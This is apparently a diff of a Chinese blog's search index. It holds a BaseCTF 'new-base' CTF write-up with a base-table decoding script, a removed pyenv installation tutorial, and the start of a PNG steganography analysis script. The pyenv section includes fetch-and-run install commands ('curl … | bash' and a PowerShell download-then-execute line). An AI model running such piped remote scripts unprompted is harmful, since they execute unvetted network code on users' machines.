class="string">&quot;7z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;03f30d0a&quot;</span>: <span class="string">&quot;pyc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ffd8ffe0&quot;</span>: <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ffd8ffe1&quot;</span>: <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ffd8ffe2&quot;</span>: <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;89504e47&quot;</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;47494638&quot;</span>: <span class="string">&quot;gif&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1f8b0800&quot;</span>: <span class="string">&quot;gz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;38425053&quot;</span>: <span class="string">&quot;psd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;49492a00&quot;</span>: <span class="string">&quot;tif&quot;</span>,</span><br><span class="line">        <span class="string">&quot;424d&quot;</span>: <span class="string">&quot;bmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;41433130&quot;</span>: <span class="string">&quot;dwg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;7b5c7274&quot;</span>: <span class="string">&quot;rtf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;3c3f786d6c&quot;</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="string">&quot;68746d6c3e&quot;</span>: <span class="string">&quot;html&quot;</span>,</span><br><span class="line">        <span class="string">&quot;44656c69766572792d646174653a&quot;</span>: <span class="string">&quot;eml&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cfad12fec5fd746f&quot;</span>: <span class="string">&quot;dbx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2142444e&quot;</span>: <span class="string">&quot;pst&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d0cf11e0&quot;</span>: <span class="string">&quot;doc/xls&quot;</span>,</span><br><span class="line">        <span class="string">&quot;5374616e64617264204a&quot;</span>: <span class="string">&quot;mdb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ff575043&quot;</span>: <span class="string">&quot;wpd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;252150532d41646f6265&quot;</span>: <span class="string">&quot;eps/ps&quot;</span>,</span><br><span class="line">        <span class="string">&quot;255044462d312e&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ac9ebd8f&quot;</span>: <span class="string">&quot;qdf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;e3828596&quot;</span>: <span class="string">&quot;pwl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;57415645&quot;</span>: <span class="string">&quot;wav&quot;</span>,</span><br><span class="line">        <span class="string">&quot;41564920&quot;</span>: <span class="string">&quot;avi&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2e7261fd&quot;</span>: <span class="string">&quot;ram&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2e524d46&quot;</span>: <span class="string">&quot;rm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;000001ba&quot;</span>: <span class="string">&quot;mpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;6d6f6f76&quot;</span>: <span class="string">&quot;mov&quot;</span>,</span><br><span class="line">        <span class="string">&quot;3026b2758e66cf11&quot;</span>: <span class="string">&quot;asf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;4d546864&quot;</span>: <span class="string">&quot;mid&quot;</span>,</span><br><span class="line">        <span class="string">&quot;00000018667479704d3441&quot;</span>: <span class="string">&quot;m4a&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 截取适当长度的文件进行匹配</span></span><br><span class="line">    maxMagicLen = <span class="built_in">max</span>(<span class="built_in">len</span>(key) <span class="keyword">for</span> key <span class="keyword">in</span> fileTypes.keys())</span><br><span class="line">    magicNumber = magicNumber[:maxMagicLen]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 猜测文件类型</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> fileTypes.items():</span><br><span class="line">        <span class="keyword">if</span> magicNumber.startswith(key):</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">saveFile</span>(<span class="params">fileExtension, byteArray, encryptedBinary, basePath</span>):</span><br><span class="line">    <span class="keyword">if</span> fileExtension <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 如果未识别文件类型，保存为二进制字符串文件</span></span><br><span class="line">        binaryOutputPath = <span class="string">f&quot;<span class="subst">&#123;basePath&#125;</span>binary.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(binaryOutputPath, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(encryptedBinary)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;无法识别文件类型，已自动保存二进制字符串为文本文件: <span class="subst">&#123;binaryOutputPath&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 保存为识别出的文件类型</span></span><br><span class="line">        outputFilePath = <span class="string">f&quot;<span class="subst">&#123;basePath&#125;</span>decrypted_file.<span class="subst">&#123;fileExtension&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(outputFilePath, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byteArray)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;识别到类型为: <span class="subst">&#123;fileExtension&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件已自动保存为: <span class="subst">&#123;outputFilePath&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 询问是否要保存二进制字符串文件</span></span><br><span class="line">        saveBinary = <span class="built_in">input</span>(<span class="string">&quot;是否要保存二进制字符串到文本文件？(yes/no): &quot;</span>).strip().lower()</span><br><span class="line">        <span class="keyword">if</span> saveBinary == <span class="string">&#x27;yes&#x27;</span> <span class="keyword">or</span> saveBinary == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            binaryOutputPath = <span class="string">f&quot;<span class="subst">&#123;basePath&#125;</span>binary.txt&quot;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(binaryOutputPath, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(encryptedBinary)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;二进制字符串已保存为: <span class="subst">&#123;binaryOutputPath&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    basePath = <span class="string">&quot;C:/Users/67300/Desktop/Misc/base8/&quot;</span>     <span class="comment"># 文件夹路径</span></span><br><span class="line">    filePath = <span class="string">f&quot;<span class="subst">&#123;basePath&#125;</span>new-base.txt&quot;</span>               <span class="comment"># 加密的文本文件路径</span></span><br><span class="line">    inputString = <span class="string">&quot;BaseCTF!&quot;</span>                    <span class="comment"># base表，长度自定义，脚本会自动识别切割长度，理论所有base都生效</span></span><br><span class="line"></span><br><span class="line">    encryptedBinary, byteArray = baseDecode(inputString, filePath, basePath)</span><br><span class="line">    fileExtension = guessFileType(byteArray)</span><br><span class="line">    saveFile(fileExtension, byteArray, encryptedBinary, basePath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>给新生的一点小提示~</title>
     <url>//post/mischint/</url>
     <content><![CDATA[<p>C3ngH学长从刚开始学Misc的时候就觉得这篇文章写的不错所以点了个收藏</p>
@@ -2862,92 +2877,6 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
       </categories>
       <tags>
         <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BaseCTF new-base WP</title>
-    <url>//post/base8/</url>
-    <content><![CDATA[<p>最近遇到一道很有意思的题，是BaseCTF 2024的new-base，考到base解密的原理，之前一直没有认真的学过base的原理，所以写一篇博客记录一下解题过程和自己用的脚本</p>
-<p>链接一篇讲的很清楚的博客<a class="link"   href="https://juejin.cn/post/6994612829437296647" >彻底弄懂base64的编码 与解码原理背景<i class="fas fa-external-link-alt"></i></a></p>
-<p>题面是仅由<code>BaseCTF!</code>八个字符重复七百多万次组成，一开始以为是词频统计但是发现只有这八个字符，联想到base64换表，但这里只有八个字符，结合文件名<code>new-base</code>猜测是base8编码，在恶补完base64的原理后手搓了一个仅限于本题使用的脚本，抽空的时候改成了任意base换表都通用的脚本，放在这里记录一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">baseDecode</span>(<span class="params">inputString, filePath, basePath</span>):</span><br><span class="line">    <span class="comment"># 从base表生成字典</span></span><br><span class="line">    dist = &#123;char: index <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(inputString)&#125;</span><br><span class="line">    bitLength = math.ceil(math.log2(<span class="built_in">len</span>(inputString)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取加密的文本文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        encryptedText = file.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将加密文本转换为对应的数字列表和二进制字符串</span></span><br><span class="line">    encryptedNumbers = [dist[char] <span class="keyword">for</span> char <span class="keyword">in</span> encryptedText]</span><br><span class="line">    encryptedBinary = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(bitLength) <span class="keyword">for</span> num <span class="keyword">in</span> encryptedNumbers])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二进制字符串转换为字节流</span></span><br><span class="line">    byteArray = <span class="built_in">bytearray</span>(<span class="built_in">int</span>(encryptedBinary[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encryptedBinary), <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encryptedBinary, byteArray</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guessFileType</span>(<span class="params">byteArray</span>):</span><br><span class="line">    <span class="comment"># 根据字节流的前几个字节推测文件类型</span></span><br><span class="line">    magicNumber = binascii.hexlify(byteArray[:<span class="number">8</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 常见文件类型的文件头/尾</span></span><br><span class="line">    fileTypes = &#123;</span><br><span class="line">        <span class="string">&quot;504b0304&quot;</span>: <span class="string">&quot;zip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;52617221&quot;</span>: <span class="string">&quot;rar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;377abcaf&quot;</span>: <span class="string">&quot;7z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;03f30d0a&quot;</span>: <span class="string">&quot;pyc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ffd8ffe0&quot;</span>: <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ffd8ffe1&quot;</span>: <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ffd8ffe2&quot;</span>: <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;89504e47&quot;</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;47494638&quot;</span>: <span class="string">&quot;gif&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1f8b0800&quot;</span>: <span class="string">&quot;gz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;38425053&quot;</span>: <span class="string">&quot;psd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;49492a00&quot;</span>: <span class="string">&quot;tif&quot;</span>,</span><br><span class="line">        <span class="string">&quot;424d&quot;</span>: <span class="string">&quot;bmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;41433130&quot;</span>: <span class="string">&quot;dwg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;7b5c7274&quot;</span>: <span class="string">&quot;rtf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;3c3f786d6c&quot;</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="string">&quot;68746d6c3e&quot;</span>: <span class="string">&quot;html&quot;</span>,</span><br><span class="line">        <span class="string">&quot;44656c69766572792d646174653a&quot;</span>: <span class="string">&quot;eml&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cfad12fec5fd746f&quot;</span>: <span class="string">&quot;dbx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2142444e&quot;</span>: <span class="string">&quot;pst&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d0cf11e0&quot;</span>: <span class="string">&quot;doc/xls&quot;</span>,</span><br><span class="line">        <span class="string">&quot;5374616e64617264204a&quot;</span>: <span class="string">&quot;mdb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ff575043&quot;</span>: <span class="string">&quot;wpd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;252150532d41646f6265&quot;</span>: <span class="string">&quot;eps/ps&quot;</span>,</span><br><span class="line">        <span class="string">&quot;255044462d312e&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ac9ebd8f&quot;</span>: <span class="string">&quot;qdf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;e3828596&quot;</span>: <span class="string">&quot;pwl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;57415645&quot;</span>: <span class="string">&quot;wav&quot;</span>,</span><br><span class="line">        <span class="string">&quot;41564920&quot;</span>: <span class="string">&quot;avi&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2e7261fd&quot;</span>: <span class="string">&quot;ram&quot;</span>,</span><br><span class="line">        <span class="string">&quot;2e524d46&quot;</span>: <span class="string">&quot;rm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;000001ba&quot;</span>: <span class="string">&quot;mpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;6d6f6f76&quot;</span>: <span class="string">&quot;mov&quot;</span>,</span><br><span class="line">        <span class="string">&quot;3026b2758e66cf11&quot;</span>: <span class="string">&quot;asf&quot;</span>,</span><br><span class="line">        <span class="string">&quot;4d546864&quot;</span>: <span class="string">&quot;mid&quot;</span>,</span><br><span class="line">        <span class="string">&quot;00000018667479704d3441&quot;</span>: <span class="string">&quot;m4a&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 截取适当长度的文件进行匹配</span></span><br><span class="line">    maxMagicLen = <span class="built_in">max</span>(<span class="built_in">len</span>(key) <span class="keyword">for</span> key <span class="keyword">in</span> fileTypes.keys())</span><br><span class="line">    magicNumber = magicNumber[:maxMagicLen]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 猜测文件类型</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> fileTypes.items():</span><br><span class="line">        <span class="keyword">if</span> magicNumber.startswith(key):</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">saveFile</span>(<span class="params">fileExtension, byteArray, encryptedBinary, basePath</span>):</span><br><span class="line">    <span class="keyword">if</span> fileExtension <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 如果未识别文件类型，保存为二进制字符串文件</span></span><br><span class="line">        binaryOutputPath = <span class="string">f&quot;<span class="subst">&#123;basePath&#125;</span>binary.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(binaryOutputPath, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(encryptedBinary)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;无法识别文件类型，已自动保存二进制字符串为文本文件: <span class="subst">&#123;binaryOutputPath&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 保存为识别出的文件类型</span></span><br><span class="line">        outputFilePath = <span class="string">f&quot;<span class="subst">&#123;basePath&#125;</span>decrypted_file.<span class="subst">&#123;fileExtension&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(outputFilePath, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(byteArray)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;识别到类型为: <span class="subst">&#123;fileExtension&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;文件已自动保存为: <span class="subst">&#123;outputFilePath&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 询问是否要保存二进制字符串文件</span></span><br><span class="line">        saveBinary = <span class="built_in">input</span>(<span class="string">&quot;是否要保存二进制字符串到文本文件？(yes/no): &quot;</span>).strip().lower()</span><br><span class="line">        <span class="keyword">if</span> saveBinary == <span class="string">&#x27;yes&#x27;</span> <span class="keyword">or</span> saveBinary == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            binaryOutputPath = <span class="string">f&quot;<span class="subst">&#123;basePath&#125;</span>binary.txt&quot;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(binaryOutputPath, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.write(encryptedBinary)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;二进制字符串已保存为: <span class="subst">&#123;binaryOutputPath&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    basePath = <span class="string">&quot;C:/Users/67300/Desktop/Misc/base8/&quot;</span>     <span class="comment"># 文件夹路径</span></span><br><span class="line">    filePath = <span class="string">f&quot;<span class="subst">&#123;basePath&#125;</span>new-base.txt&quot;</span>               <span class="comment"># 加密的文本文件路径</span></span><br><span class="line">    inputString = <span class="string">&quot;BaseCTF!&quot;</span>                    <span class="comment"># base表，长度自定义，脚本会自动识别切割长度，理论所有base都生效</span></span><br><span class="line"></span><br><span class="line">    encryptedBinary, byteArray = baseDecode(inputString, filePath, basePath)</span><br><span class="line">    fileExtension = guessFileType(byteArray)</span><br><span class="line">    saveFile(fileExtension, byteArray, encryptedBinary, basePath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python版本管理器pyenv的安装与使用</title>
-    <url>//post/pyenv/</url>
-    <content><![CDATA[<p><strong>pyenv</strong> 是一个用于管理多个 Python 版本的工具。它允许你在同一台机器上安装、切换和管理不同的 Python 版本，而不需要依赖系统级的 Python 安装。</p>
-<p>GitHub主页：</p>
-<p><a class="link"   href="https://github.com/pyenv/pyenv" >pyenv/pyenv: Simple Python version management (github.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://github.com/pyenv-win/pyenv-win" >pyenv-win/pyenv-win: pyenv for Windows<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="安装pyenv">安装pyenv</h3>
-<h4 id="Ubuntu">Ubuntu</h4>
-<ul>
-<li>
-<p>依赖安装</p>
-<p>pyenv需要编译安装python，所以需要安装相关库</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install git curl build-essential libssl-dev zlib1g-dev libbz2-dev \</span><br><span class="line">libreadline-dev libsqlite3-dev wget llvm libncurses5-dev libncursesw5-dev \</span><br><span class="line">xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>自动安装脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://pyenv.run | bash</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>添加环境变量到<code>.bashrc</code>或<code>.zshrc</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PYENV_ROOT=<span class="string">&quot;<span class="variable">$HOME</span>/.pyenv&quot;</span></span><br><span class="line">[[ -d <span class="variable">$PYENV_ROOT</span>/bin ]] &amp;&amp; <span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PYENV_ROOT</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(pyenv init -)</span>&quot;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="Windows">Windows</h4>
-<ul>
-<li>
-<p>自动安装脚本</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="string">&quot;https://raw.githubusercontent.com/pyenv-win/pyenv-win/master/pyenv-win/install-pyenv-win.ps1&quot;</span> <span class="literal">-OutFile</span> <span class="string">&quot;./install-pyenv-win.ps1&quot;</span>; &amp;<span class="string">&quot;./install-pyenv-win.ps1&quot;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h3 id="使用pyenv">使用pyenv</h3>
-<h4 id="安装-Python-版本">安装 Python 版本</h4>
-<p>使用 <code>pyenv</code> 可以安装任意支持的 Python 版本：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv install 3.8.12</span><br><span class="line">pyenv install 3.9.7</span><br><span class="line">pyenv install 3.10.0</span><br></pre></td></tr></table></figure>
-<p>你可以使用 <code>pyenv install --list</code> 查看所有可用的 Python 版本。</p>
-<h4 id="切换-Python-版本">切换 Python 版本</h4>
-<p><code>pyenv</code> 支持全局和局部（本地）切换 Python 版本。</p>
-<ul>
-<li>
-<p><strong>全局切换</strong>（影响所有项目）：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv global 3.9.7</span><br></pre></td></tr></table></figure>
-<p>在Linux下可以多版本共存，例如<code>pyenv global 3.9.13 2.7.18</code>，即可实现两个版本同时存在，在Windows下好像不行，有待研究</p>
-</li>
-<li>
-<p><strong>局部切换</strong>（仅影响当前目录或项目）：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv <span class="built_in">local</span> 3.8.12</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p><strong>查看当前 Python 版本</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv version</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p><strong>查看所有安装的 Python 版本</strong>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv versions</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="卸载-Python-版本">卸载 Python 版本</h4>
-<p>如果你不再需要某个 Python 版本，可以使用以下命令卸载它：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv uninstall 3.8.12</span><br></pre></td></tr></table></figure>
-<h3 id="软链接">软链接</h3>
-<p>如果输入python3可以正常进入，输入python则不行，需要设置软链接，则可以把python3.9链接到python</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/bin/python3.9  /usr/bin/python</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>开发</category>
-      </categories>
-      <tags>
-        <tag>环境配置</tag>
       </tags>
   </entry>
   <entry>
@@ -3249,6 +3178,95 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
       </tags>
   </entry>
   <entry>
+    <title>png-all-in-one</title>
+    <url>//post/png-all-in-one/</url>
+    <content><![CDATA[<p>C3ngH决定在暑假帮助Lunatic师傅填上图片隐写（Picture_All_In_One）的巨坑，并强烈谴责Lunatic开坑跑路的行为（还有个Misc Killer的天坑</p>
+<h3 id="PNG-All-In-One">PNG All In One</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">image_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">image_name = image_path.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ask_continue</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        answer = <span class="built_in">input</span>(<span class="string">f&quot;\n否需要继续分析<span class="subst">&#123;image_name&#125;</span> (yes/no): &quot;</span>).lower()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> answer == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> answer == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;继续分析%s…&quot;</span> % image_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> answer == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> answer == <span class="string">&quot;no&quot;</span>:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入&#x27;yes&#x27; or &#x27;no&#x27;.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ask_detail</span>(<span class="params">result</span>):</span><br><span class="line">    answer = <span class="built_in">input</span>(<span class="string">f&quot;\n是否需要查看详细信息 (yes/no): &quot;</span>).lower()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> answer == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> answer == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(result.stdout)</span><br><span class="line">    <span class="keyword">elif</span> answer == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> answer == <span class="string">&quot;no&quot;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入&#x27;yes&#x27; or &#x27;no&#x27;.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_command</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;命令错误: python3 png_all_in_one.py example.png&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;.*\.png$&#x27;</span>, </span><br><span class="line">                    sys.argv[<span class="number">1</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件后缀名错误: 请使用.png文件&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始分析%s…\n&quot;</span> % image_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">command</span>):</span><br><span class="line">    result = subprocess.run(command, shell=<span class="literal">True</span>,</span><br><span class="line">                            stdout=subprocess.PIPE,</span><br><span class="line">                            stderr=subprocess.PIPE,</span><br><span class="line">                            universal_newlines=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exiftool</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;使用exiftool进行分析…\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">   